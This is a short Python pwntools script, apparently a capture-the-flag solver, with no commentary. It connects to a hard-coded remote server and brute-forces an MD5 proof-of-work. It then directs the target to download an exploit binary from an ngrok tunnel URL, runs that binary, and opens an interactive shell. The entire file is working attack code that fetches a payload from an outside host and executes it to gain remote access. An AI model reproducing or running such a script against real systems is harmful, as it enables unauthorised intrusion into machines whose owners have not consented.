from hashlib import sha256, md5
from itertools import product
import string
import threading
from pwn import *

check = False


HOST = '3.36.86.231'
PORT = 4132


r = remote(HOST, PORT)
recv = r.recvuntil(b'MD5(X = ')

to_crack = r.recvuntil(b"+")[:-1].decode()
r.recvuntil(b'??????) = ')
res = r.recvline().decode().strip()

to_crack = bytes.fromhex(to_crack)
list_ = [p8(i) for i in range(256)]

print(to_crack)

for a in product(list_, repeat=3):
    hashed = md5(to_crack + b''.join(a)).hexdigest()
    if hashed == res:
        _ = b"".join(a)
        break

recv = r.recvuntil(b': ')
r.sendline((to_crack+_).hex().encode())

r.sendlineafter(b'1 - input binary download link\n', b'1')
r.sendlineafter(b'Exploit binary download link: ',
                b'https://dba6-113-161-77-223.ngrok-free.app/exploit')

r.sendlineafter(b' $ ', b'/exploit')
r.interactive()
